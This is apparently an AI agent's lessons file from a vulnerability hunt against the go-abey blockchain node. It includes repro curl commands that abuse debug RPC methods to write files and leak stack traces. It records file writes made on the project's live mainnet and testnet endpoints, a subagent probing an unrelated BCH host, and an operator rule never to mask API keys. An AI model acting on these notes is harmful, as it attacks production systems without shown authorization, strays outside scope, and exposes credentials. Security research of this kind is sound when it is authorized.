# AbeyFoundation 2026-08-16 — Scope, Toolchain & Reporting Lessons

Source: single session hunting pre-auth RCE in AbeyFoundation/go-abey (fork geth, Go, 807 files/131k LOC). 4 subagents x 2 waves, 6h persistence requirement, live probes + local clean install.

## 1. BCH vs ABEY scope gate (false positive trap)

- User: "bchscan itu bukan abey bodoh, kenapa ngikut?" — agent-4 had probed `rpc.bchscan.io:6060` (chainId `0x17ac=6060` BCH) and claimed ABEY RCE.
- Ground truth: `params/config.go:MainnetChainConfig ChainID 179 (0xb3)` / `Testnet 178 (0xb2)` ; legacy README `19330/18928/400`. Live ABEY: `https://rpc.abeychain.com -> 0xb3` + `https://testrpc.abeychain.com -> 0xb2` (verified via `eth_chainId` + `net_version` + `web3_clientVersion Gabey/v3.4.8`). `documents/README.md:9` lists both.
- Rule: gate every live RPC claim with `eth_chainId == params/config.go ChainID`; discard `6060` findings. Add disclaimer "bchscan EXCLUDE" in report. Check both `api.github.com/orgs/AbeyFoundation/repos` and `users` (Safe forks noise: 9/12 repos fork:true safe-global).

## 2. Go toolchain mismatch — `pollCopyFileRange redeclared`

- Failure: `go 1.23.0` + `build/env.sh` GOPATH workspace → `os/zero_copy_linux.go:14 pollCopyFileRange redeclared / os/readfrom_linux.go:14` + `wrapSyscallError` + `readFrom`.
- Fix: `go.mod: go 1.22.0` → `GOTOOLCHAIN=go1.22.0 go version` downloads toolchain, export `PATH=/root/go/pkg/mod/golang.org/toolchain@v0.0.1-go1.22.0.linux-amd64/bin:$PATH`, then `make gabey` → `build/bin/gabey 35M` Done. Do NOT edit stdlib.
- Detect: `grep -n pollCopyFileRange /usr/local/go/src/os/*.go` on failure.

## 3. Proven tiers (anti-overclaim)

- `PROVEN-live` = `curl debug_writeMemProfile /tmp/pwn => {"result":null}` + `ls -lh /tmp/pwn` exists (local 8855 + mainnet rpc.abeychain.com + testrpc both `result:null` for `/tmp`/`/var/tmp`/`/dev/shm`; `/etc/cron.d` fails non-root → permission check).
- `PROVEN-in-code` = `internal/debug/api.go:213 os.Create(expandHome(file))` + `abey/tracers/tracer.go:316 PevalString` exists but live needs `rpc_modules` contains `debug`.
- `THEORETICAL` = requires `--rpcapi debug` or `--singlenode` (hardcode `<redacted>` + `HTTPModules personal,admin,miner`). Default `node/defaults.go HTTPModules=[net,web3]` = safe; always live-probe `rpc_modules` before claiming singlenode total-compromise.

## 4. Explanation-first + sawntai warung style (operator preference)

- Complaint: "laporanmu acak adut" when fragmented; "jelasin sawntai dulu apa yg lo temuin".
- Required order: 1) FIRST PRINCIPLES (claim vs actual vs assumptions) BEFORE code/curl, 2) warung analogy table (`Dapur=debug Handler`, `Pusat=abey/tracers duktape`, `Spanduk=rpc/http.go ServeHTTP`, `Kasir=ExportChain/ImportChain`, `Kurir=wallet Base_Url http://54.255.45.202:8010`, `Brankas=bftkey/nodekey plain`), 3) `1 dapet apa 2 dapet apa` tables, short paragraphs, `lo/gue 😘💕`, 4) honest tier label.
- Token-efficient by default; longer only for correctness. Never mask API keys when showing config (user expects full display).

## 5. File-write vector nuance

- `internal/debug/api.go:writeProfile` content is fixed pprof binary (not attacker string) → classify as HIGH arbitrary file write + info-leak (stack/heap), not RCE, unless node runs as root or datadir writable. Probe matrix: `/tmp` success, `/root/.ssh` fail.

## Repro

```bash
GOTOOLCHAIN=go1.22.0 make gabey
rm -rf /tmp/abey-data && /tmp/abey/go-abey/build/bin/gabey --datadir /tmp/abey-data --singlenode --rpc --rpcaddr 127.0.0.1 --rpcport 8855 --rpcapi debug,abey,eth,net,web3 --rpcvhosts "*" --rpccorsdomain "*" &
curl -s -H "Content-Type: application/json" --data '{"jsonrpc":"2.0","id":1,"method":"debug_writeMemProfile","params":["/tmp/pwn3_proof"]}' http://127.0.0.1:8855
ls -lh /tmp/pwn3_proof; curl -s --data '{"jsonrpc":"2.0","id":1,"method":"debug_stacks","params":[]}' http://127.0.0.1:8855 | head -c 800
# live gate
for ep in https://rpc.abeychain.com https://testrpc.abeychain.com; do curl -sk -H "Content-Type: application/json" --data '{"jsonrpc":"2.0","id":1,"method":"eth_chainId","params":[]}' $ep; done
# expect 0xb3 / 0xb2, not 0x17ac
```
